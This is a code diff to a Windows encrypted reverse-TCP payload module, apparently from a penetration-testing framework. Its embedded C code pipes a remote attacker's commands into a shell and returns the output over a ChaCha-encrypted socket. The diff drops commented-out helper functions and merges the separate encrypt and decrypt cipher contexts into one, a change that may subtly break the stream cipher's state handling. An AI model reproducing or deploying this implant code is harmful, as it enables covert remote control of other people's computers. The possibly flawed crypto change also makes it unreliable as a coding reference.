@@ -247,21 +247,6 @@ module Payload::Windows::EncryptedReverseTcp
         return buf;
       }
     ^
-=begin
-    %Q^
-      char *chacha_data(char *buf, int len, char *key, char *nonce)
-      {
-        chacha_ctx ctx;
-        chacha_keysetup(&ctx, key, 256, 96);
-        chacha_ivsetup(&ctx, nonce);
-
-        chacha_encrypt_bytes(&ctx, buf, buf, len);
-        buf[len] = '\\0';
-
-        return buf;
-      }
-    ^
-=end
   end
 
   def chacha_func
@@ -275,22 +260,6 @@ module Payload::Windows::EncryptedReverseTcp
           return out;
         }
     ^
-=begin
-    %Q^
-      char *chacha_data(char *buf, int len, char *key, char *nonce)
-        {
-          chacha_ctx ctx;
-          chacha_keysetup(&ctx, key, 256, 96);
-          chacha_ivsetup(&ctx, nonce);
-
-          FuncVirtualAlloc VirtualAlloc = (FuncVirtualAlloc) GetProcAddressWithHash(#{get_hash('kernel32.dll', 'VirtualAlloc')}); // hash('kernel32.dll',
-          char *out = VirtualAlloc(NULL, len+1, MEM_COMMIT, PAGE_READWRITE);
-          chacha_encrypt_bytes(&ctx, buf, out, len);
-          out[len] = '\\0';
-          return out;
-        }
-    ^
-=end
   end
 
   def exit_proc
@@ -451,13 +420,9 @@ module Payload::Windows::EncryptedReverseTcp
         char *key = init_key;
         char *nonce = init_nonce;
 
-        chacha_ctx encrypt_ctx;
-        chacha_keysetup(&encrypt_ctx, key, 256, 96);
-        chacha_ivsetup(&encrypt_ctx, nonce);
-
-        chacha_ctx decrypt_ctx;
-        chacha_keysetup(&decrypt_ctx, key, 256, 96);
-        chacha_ivsetup(&decrypt_ctx, nonce);
+        chacha_ctx ctx;
+        chacha_keysetup(&ctx, key, 256, 96);
+        chacha_ivsetup(&ctx, nonce);
 
         do
         {
@@ -469,16 +434,13 @@ module Payload::Windows::EncryptedReverseTcp
               ExitProcess(term_stat);
             }
 
-            char *res = chacha_data(stream, 44, &decrypt_ctx);
+            char *res = chacha_data(stream, 44, &ctx);
             key = res + 12;
             nonce = res;
             new_key = 1;
 
-            chacha_keysetup(&encrypt_ctx, key, 256, 96);
-            chacha_ivsetup(&encrypt_ctx, nonce);
-
-            chacha_keysetup(&decrypt_ctx, key, 256, 96);
-            chacha_ivsetup(&decrypt_ctx, nonce);
+            chacha_keysetup(&ctx, key, 256, 96);
+            chacha_ivsetup(&ctx, nonce);
           }
 
           if(PeekNamedPipe(out, NULL, 0, NULL, &data, NULL) && data > 0)
@@ -487,7 +449,7 @@ module Payload::Windows::EncryptedReverseTcp
             {
               ExitProcess(term_stat);
             }
-            char *cmd = chacha_data(buf, bytes_received, &encrypt_ctx);
+            char *cmd = chacha_data(buf, bytes_received, &ctx);
             SendData(s, cmd, bytes_received, 0);
             SecureZeroMemory(buf, buf_size);
             VirtualFree(cmd, bytes_received+1, MEM_RELEASE);
@@ -499,7 +461,7 @@ module Payload::Windows::EncryptedReverseTcp
             bytes_received = RecvData(s, buf, buf_size-1, 0);
             if(bytes_received > 0)
             {
-              char *dec_cmd = chacha_data(buf, bytes_received, &decrypt_ctx);
+              char *dec_cmd = chacha_data(buf, bytes_received, &ctx);
               WriteFile(in, dec_cmd, bytes_received, &bytes_written, NULL);
               SecureZeroMemory(buf, buf_size);
               VirtualFree(dec_cmd, bytes_received+1, MEM_RELEASE);
